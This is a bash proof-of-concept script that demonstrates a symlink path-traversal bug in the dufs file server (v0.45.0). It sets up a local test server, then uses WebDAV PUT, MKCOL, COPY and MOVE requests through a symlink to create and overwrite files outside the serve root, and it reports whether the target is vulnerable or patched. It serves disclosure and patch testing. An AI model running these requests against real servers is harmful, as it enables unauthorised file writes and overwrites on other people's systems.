#!/bin/bash
set -e

# PoC: Symlink Path Traversal Allows Arbitrary File Write Outside Serve Root (Directory Symlink Variant)
# Tested: dufs v0.45.0
# Affected: Unknown (requires vendor confirmation)
# Vulnerability: Arbitrary File Write via Symlink when allow_symlink=false
# Execution condition: The project root must be the current directory.

# Serve Root
ROOT_DIR="/tmp/dufs-poc-$$/root"
# Target outside root
EXTERNAL_DIR="/tmp/dufs-poc-$$/external"
LINK_NAME="evil_link"
PORT=15555
TARGET_CONTENT="VULNERABLE: File written outside dufs root directory"

# Cleanup function to remove temp files and kill server
cleanup() {
    echo "[*] Cleaning up..."
    # To check files leaked from the serve root, change this to a comment.
    # rm -rf "$ROOT_DIR" "$EXTERNAL_DIR"
    pkill -f "dufs.*$PORT" 2>/dev/null || true
    sleep 1
}
trap cleanup EXIT

# Step 1: Setup environment
echo "[*] Step 1: Setup environment"
rm -rf "$ROOT_DIR" "$EXTERNAL_DIR"
mkdir -p "$ROOT_DIR" "$EXTERNAL_DIR"
# end Step 1

# Step 2: Create symlink inside root pointing outside
echo "[*] Step 2: Create symlink inside root pointing outside"
ln -s "$EXTERNAL_DIR" "$ROOT_DIR/$LINK_NAME"
echo "    Symlink created: $ROOT_DIR/$LINK_NAME -> $EXTERNAL_DIR"
# end Step 2

# Step 3: Start dufs server with allow_symlink=false and allow_upload=true, allow_delete=true
echo "[*] Step 3: Start dufs server (allow_symlink=false, allow_upload=true, allow_delete=true)"
# Get the dufs binary path (prefer release)
DUFS_BIN=$(find ./target -maxdepth 3 -type f -executable -name dufs \
    \( -path "*/release/*" -o -path "*/debug/*" \) 2>/dev/null | sort -r | head -1)

if [ -z "$DUFS_BIN" ]; then
    echo "Error: dufs binary not found. Run 'cargo build' first." >&2
    exit 1
fi
echo "Using binary: $DUFS_BIN"

# launch background dufs and log output
# --allow-symlink defaults to false
$DUFS_BIN "$ROOT_DIR" --allow-upload --allow-delete --port $PORT --log-file /tmp/dufs-poc-$$.log > /dev/null 2>&1 &
DUFS_PID=$!
echo "    dufs started with PID $DUFS_PID on port $PORT"

sleep 2

# Verify server is running
if ! kill -0 $DUFS_PID 2>/dev/null; then
    echo "[!] ERROR: dufs failed to start"
    exit 1
fi

# Step 4: Exploit - Write file via symlink to outside root
echo "[*] Step 4: Exploit - Write file via symlink to outside root"
echo ""

# Test 4.1: PUT method
echo "  [4.1] Testing PUT method..."
PUT_FILE="webdav_put_$$.txt"
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
    "http://127.0.0.1:$PORT/$LINK_NAME/$PUT_FILE" \
    -H "Content-Type: text/plain" \
    -d "$TARGET_CONTENT")
echo "    HTTP Status: $HTTP_STATUS"

# Test 4.2: MKCOL method (WebDAV - create directory)
echo "  [4.2] Testing MKCOL method (WebDAV)..."
MKCOL_DIR="webdav_mkcol_dir_$$"
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X MKCOL \
    "http://127.0.0.1:$PORT/$LINK_NAME/$MKCOL_DIR")
echo "    Target: http://127.0.0.1:$PORT/$LINK_NAME/$MKCOL_DIR"
echo "    HTTP Status: $HTTP_STATUS"

# Test 4.3: COPY method (WebDAV - copy file to symlink destination)
echo "  [4.3] Testing COPY method (WebDAV)..."
# First create a source file inside root
SOURCE_FILE="source_for_copy.txt"
curl -s -X PUT "http://127.0.0.1:$PORT/$SOURCE_FILE" \
    -H "Content-Type: text/plain" \
    -d "Source file for copy test" > /dev/null
COPY_DEST="webdav_copy_$$"
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X COPY \
    "http://127.0.0.1:$PORT/$SOURCE_FILE" \
    -H "Destination: http://127.0.0.1:$PORT/$LINK_NAME/$COPY_DEST")
echo "    Target: http://127.0.0.1:$PORT/$LINK_NAME/$COPY_DEST"
echo "    HTTP Status: $HTTP_STATUS"

# Test 4.4: MOVE method (WebDAV - move file to symlink destination)
# --allow-delete option is required
echo "  [4.4] Testing MOVE method (WebDAV)..."
MOVE_SOURCE="source_for_move_$$.txt"
curl -s -X PUT "http://127.0.0.1:$PORT/$MOVE_SOURCE" \
    -H "Content-Type: text/plain" \
    -d "Source file for move test" > /dev/null
MOVE_DEST="webdav_move_$$"
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X MOVE \
    "http://127.0.0.1:$PORT/$MOVE_SOURCE" \
    -H "Destination: http://127.0.0.1:$PORT/$LINK_NAME/$MOVE_DEST")
echo "    Target: http://127.0.0.1:$PORT/$LINK_NAME/$MOVE_DEST"
echo "    HTTP Status: $HTTP_STATUS"

# Test 4.5: COPY method to overwrite existing file (CRITICAL)
# This is the most dangerous - works without --allow-delete
echo "  [4.5] Testing COPY method - Overwrite existing file (CRITICAL)..."
EXISTING_FILE="existing_file_$$"
echo "ORIGINAL CONTENT - This should be overwritten" > "$EXTERNAL_DIR/$EXISTING_FILE"
echo "    Created existing file: $EXTERNAL_DIR/$EXISTING_FILE"
SOURCE_OVERWRITE="source_for_overwrite.txt"
curl -s -X PUT "http://127.0.0.1:$PORT/$SOURCE_OVERWRITE" \
    -H "Content-Type: text/plain" \
    -d "OVERWRITTEN CONTENT - Attack successful" > /dev/null
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X COPY \
    "http://127.0.0.1:$PORT/$SOURCE_OVERWRITE" \
    -H "Destination: http://127.0.0.1:$PORT/$LINK_NAME/$EXISTING_FILE")
echo "    Target: http://127.0.0.1:$PORT/$LINK_NAME/$EXISTING_FILE"
echo "    HTTP Status: $HTTP_STATUS"

# end Step 4

sleep 1

# Step 5: Verify if files were created outside root
echo "[*] Step 5: Verify vulnerability"
if [ -f "$EXTERNAL_DIR/$PUT_FILE" ]; then
    echo ""
    echo "[VULNERABLE - PATH TRAVERSAL]"
    echo "Files created OUTSIDE serve root:"

    # Check WebDAV artifacts
    echo "  [PUT]   File created: $EXTERNAL_DIR/$PUT_FILE"
    if [ -d "$EXTERNAL_DIR/$MKCOL_DIR" ]; then
        echo "  [MKCOL] Directory created: $EXTERNAL_DIR/$MKCOL_DIR"
    fi
    if [ -f "$EXTERNAL_DIR/$COPY_DEST" ]; then
        echo "  [COPY]  File created: $EXTERNAL_DIR/$COPY_DEST"
    fi
    if [ -f "$EXTERNAL_DIR/$MOVE_DEST" ]; then
        echo "  [MOVE]  File created: $EXTERNAL_DIR/$MOVE_DEST"
    fi
    if [ -f "$EXTERNAL_DIR/$EXISTING_FILE" ]; then
        OVERWRITE_CONTENT=$(cat "$EXTERNAL_DIR/$EXISTING_FILE")
        if [[ "$OVERWRITE_CONTENT" == *"OVERWRITTEN"* ]]; then
            echo "  [COPY-OVERWRITE] Existing file overwritten!"
            echo "                   $EXTERNAL_DIR/$EXISTING_FILE"
            echo "                   Content: $OVERWRITE_CONTENT"
        fi
    fi
    
    echo ""
    ls -lah "$EXTERNAL_DIR"
    exit 0
else
    echo ""
    echo "[NOT VULNERABLE - PATCHED]"
    echo "File was NOT created outside root (patch is effective)"
    exit 1
fi
# end Step 5
